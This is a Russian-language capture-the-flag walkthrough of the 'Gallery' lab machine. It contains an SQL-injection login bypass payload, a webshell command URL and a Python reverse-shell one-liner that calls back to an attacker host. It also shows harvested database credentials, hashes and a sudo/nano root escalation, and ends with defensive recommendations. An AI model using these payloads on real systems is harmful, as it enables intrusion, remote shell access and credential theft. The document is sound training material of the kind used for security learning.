# Отчет по прохождению Gallery

## 1. Разведка (Reconnaissance)

### Сканирование портов
Выполнено сканирование целевой системы с использованием Nmap:
```bash
nmap -sC -sV <IP> -T5 -v -o nmap.log -p-
```

**Результаты:**
- 80/tcp — HTTP (стандартная страница Apache)
- 8080/tcp — HTTP (приложение с формой логина, AdminLTE v3.1.0-rc)

---

## 2. Анализ веб-приложения

### Форма логина и SQL-инъекция
При попытке аутентификации через `http://ip/gallery/classes/Login.php?f=login` сервер возвращал SQL-запрос в ответе:
```json
{
    "status": "incorrect",
    "last_qry": "SELECT * from users where username = 'test' and password = md5('test') "
}
```

Использован классический payload для обхода аутентификации:
```sql
test' OR '1'='1' --
```

Аутентификация пройдена успешно. Получен доступ к аккаунту **Administrator**.

---

## 3. Идентификация CMS и эксплуатация

### CMS: Simple Image Gallery System
Версия: 1.0

### Поиск уязвимости
Обнаружен публичный эксплойт: **Simple Image Gallery 1.0 — Remote Code Execution (RCE) (Unauthenticated)**

### Запуск эксплойта
Эксплойт выполнен, на сервер загружен PHP-скрипт для выполнения команд.

### Проверка RCE
```bash
http://ip/gallery/uploads/1776133440_TagoqetgbbmvijmoosyLetta.php?cmd=id
```

**Результат:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 4. Получение полноценной оболочки

### Reverse shell
Сформирован и отправлен payload:
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Оболочка получена. Выполнено улучшение через PTY.

---

## 5. Пост-эксплуатация и сбор данных

### Конфигурация базы данных
В файлах приложения найдены учетные данные для подключения к MySQL:
```php
define('DB_USERNAME', 'gallery_user');
define('DB_PASSWORD', 'passw0rd321');
define('DB_NAME', 'gallery_db');
```

Также обнаружен хеш разработчика:
```php
$dev_data = array(
    'id'=>'-1',
    'firstname'=>'Developer',
    'lastname'=>'',
    'username'=>'dev_oretnom',
    'password'=>'5da283a2d990e8d8512cf967df5bc0d0',
    ...
);
```

### Подключение к базе данных
```sql
mysql -u gallery_user -ppassw0rd321 -D gallery_db
```

### Извлечение данных пользователей
```sql
SELECT * FROM users;
```

**Результат:**
| id | username | password                          |
|----|----------|-----------------------------------|
| 1  | admin    | a228b12a08b6527e7978cbe5d914531c |

Хеш администратора извлечён.

---

## 6. Переход на пользователя mike

### Находка в `/var/backups`
В директории бэкапов обнаружен текстовый файл с потенциальными паролями:
```
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123
```
Указанные пароли не подошли.

### Анализ `.bash_history`
В файле `/var/backups/mike_home_backup/.bash_history` найдена строка:
```bash
sudo -lb3stpassw0rdbr0xx
```

Пароль `b3stpassw0rdbr0xx` принят как рабочий для пользователя `mike`.

### Проверка пользователя
```bash
mike@ip-10-49-160-249:/var/log$ id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
```

### Флаг пользователя
Флаг `mike` извлечён из `/home/mike/user.txt`.

---

## 7. Эскалация привилегий до root

### Анализ sudo-прав
```bash
mike@ip-10-49-160-249:/var/log$ sudo -l
```

**Результат:**
```
User mike may run the following commands:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

### Анализ скрипта `/opt/rootkit.sh`
```bash
cat /opt/rootkit.sh
```

Содержимое:
```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

Права на запись отсутствуют:
```bash
-rw-r--r-- 1 root root 364 May 20  2021 /opt/rootkit.sh
```

### Эксплуатация через nano
Запущен скрипт от root:
```bash
export TERM=xterm
sudo /bin/bash /opt/rootkit.sh
```

Выбран пункт `read`. Открылся редактор `nano` с привилегиями root.

Впервые применён метод чтения файлов через встроенную функцию `nano`:
- Нажато `Ctrl + F9` (или `Ctrl + R` в зависимости от версии)
- Введён путь `/root/root.txt`
- Файл прочитан

### Получение root-флага
Флаг root извлечён.

---

## 8. Выводы

### Векторы атаки
1. **SQL-инъекция** в форме логина → обход аутентификации
2. **RCE через Simple Image Gallery 1.0** → выполнение команд от www-data
3. **Утечка паролей из бэкапов и истории команд** → переход на пользователя mike
4. **Sudo с nano** → чтение root-файлов через редактор

### Достижения
- Впервые применён метод чтения файлов через терминал `nano`, открытый от root
- Использована комбинация SQLi → RCE → утечка паролей → эскалация через sudo

### Рекомендации
1. Использовать параметризованные запросы для защиты от SQL-инъекций
2. Обновить Simple Image Gallery System до актуальной версии
3. Не хранить пароли в бэкапах и истории команд
4. Ограничить sudo-права для пользователя mike
5. Запретить использование nano в скриптах, запускаемых от root